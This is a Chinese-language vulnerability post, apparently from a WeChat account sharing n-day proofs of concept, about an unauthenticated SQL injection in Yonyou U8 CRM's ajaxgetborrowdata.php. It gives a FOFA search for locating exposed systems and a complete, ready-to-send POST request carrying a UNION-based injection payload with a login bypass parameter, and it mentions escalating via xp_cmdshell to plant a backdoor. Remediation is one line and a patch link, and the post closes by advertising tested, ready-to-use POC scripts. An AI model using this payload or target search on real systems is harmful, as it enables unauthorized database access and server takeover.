#  用友U8 CRM ajaxgetborrowdata.php SQL注入漏洞   
Superhero  nday POC   2024-12-10 08:54  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCkYN4sZibCVo6EFo0N9b7Kib4I4N6j6Y10tynLOdgov9ibUmaNwW5yeoCbQ/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCkhic5lbbPcpxTLtLccZ04WhwDotW7g2b3zBgZeS5uvFH4dxf0tj0Rutw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCk524CiapZejYicic1Hf8LPt8qR893A3IP38J3NMmskDZjyqNkShewpibEfA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
内容仅用于学习交流自查使用，由于传播、利用本公众号所提供的  
POC  
信息及  
POC对应脚本  
而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号nday poc及作者不为此承担任何责任，一旦造成后果请自行承担！如文章有侵权烦请及时告知，我们会立即删除文章并致歉。谢谢！  
  
  
**00******  
  
**产品简介**  
  
  
用友U8 CRM是用友公司专为中小企业设计的一款客户关系管理软件，以客户需求为核心，提供了全面的客户关系管理功能，旨在帮助企业提升客户满意度和销售业绩。它集成了销售管理、客户服务、市场营销等多个模块，形成一个完整、统一的客户关系管理平台。  
  
  
**01******  
  
**漏洞概述**  
  
  
用友U8 CRM客户关系管理系统  
  
/borrowout/ajaxgetborrowdata.php 文件多个方法存在SQL注入漏洞，未经身份验证的攻击者通过漏洞执行任意SQL语句，调用xp_cmdshell写入后门文件，执行任意代码，从而获取到服务器权限。  
  
  
**02******  
  
**搜索引擎**  
  
  
FOFA:  
```
title="用友U8CRM"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwIpwek1c11Z3bdgcfpYSwoB886VxoibaeAbOMQIZjBEcCeP6yEecz2dDIP4NcQibjehthncI2Kjc2Bw/640?wx_fmt=png&from=appmsg "")  
  
  
**03******  
  
**漏洞复现**  
```
POST /borrowout/ajaxgetborrowdata.php?DontCheckLogin=1&Action=getWarehouseOtherInfo HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=bgsesstimeout-;
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Connection: close

cWhCode=1%27+UNION+ALL+SELECT+CHAR%28113%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28106%29%2BCHAR%28113%29%2BCHAR%2899%29%2BCHAR%28105%29%2BCHAR%28114%29%2BCHAR%2887%29%2BCHAR%28120%29%2BCHAR%2874%29%2BCHAR%2866%29%2BCHAR%28106%29%2BCHAR%2885%29%2BCHAR%2898%29%2BCHAR%2886%29%2BCHAR%2874%29%2BCHAR%2875%29%2BCHAR%2868%29%2BCHAR%28108%29%2BCHAR%2899%29%2BCHAR%28114%29%2BCHAR%2890%29%2BCHAR%2867%29%2BCHAR%2874%29%2BCHAR%28114%29%2BCHAR%2873%29%2BCHAR%2876%29%2BCHAR%2877%29%2BCHAR%28101%29%2BCHAR%2870%29%2BCHAR%28122%29%2BCHAR%2888%29%2BCHAR%2886%29%2BCHAR%28103%29%2BCHAR%2881%29%2BCHAR%2899%29%2BCHAR%28107%29%2BCHAR%2865%29%2BCHAR%2868%29%2BCHAR%2867%29%2BCHAR%2885%29%2BCHAR%2876%29%2BCHAR%2879%29%2BCHAR%28122%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28122%29%2BCHAR%2898%29%2BCHAR%28113%29--+KRVC
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwJznu0RczNJHLUCftK82LHWZfMGGUT0OGLWJlwXMJxicN8qZKGaE28cziapajYtVgISRTlFIpPNSBFw/640?wx_fmt=png&from=appmsg "")  
  
sqlmap验证  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwJznu0RczNJHLUCftK82LHW88iaESTTEmKZqk6nbY7EjSvfico1yNWWvYkW9Z0uoZUKibkFkcxicyn5Ww/640?wx_fmt=png&from=appmsg "")  
  
  
**04**  
  
**检测工具**  
  
  
nuclei  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwJznu0RczNJHLUCftK82LHWa4VhhJ3Hlcozb2NfDSVc5lNouaO3567B3WOBGVH6gG6Rq6WxNRQRLA/640?wx_fmt=png&from=appmsg "")  
  
afrog  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwJznu0RczNJHLUCftK82LHWvicXIOkKnm1U2RMgrYoTopj1CiaZiaME7OdOYnlOZAoiczKpg4OJpy0ICQ/640?wx_fmt=png&from=appmsg "")  
  
xray  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwJznu0RczNJHLUCftK82LHWtoHQxbXG6q2mH91AO1oreAzMkLlpVQHqC9tInN314kVfntDkT9EPbg/640?wx_fmt=png&from=appmsg "")  
  
  
**05******  
  
**修复建议**  
  
  
1、关闭互联网暴露面或接口设置访问权限  
  
2、打补丁：  
  
https://security.yonyou.com/#/noticeInfo?id=649  
  
  
**06******  
  
**内部圈子介绍**  
  
  
1、本圈子主要是分享网上公布的1day/nday POC详情及对应检测脚本，目前POC脚本均支持xray、afrog、nuclei等三款常用工具。  
  
2、三款工具都支持内置poc+自写poc目录一起扫描。  
  
3、保持每周更新10-15个poc。  
  
4、所发布的POC脚本均已测试完毕，直接拿来即用。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwI0X77l5WtnpfTexA6RwHXSbf1x3ZyT3bhcbWzRoFLyAgHkSMk9yGaZK5FDGcSCQp9ibPcicxHXIOcg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&retryload=2&tp=webp "")  
  
  
  
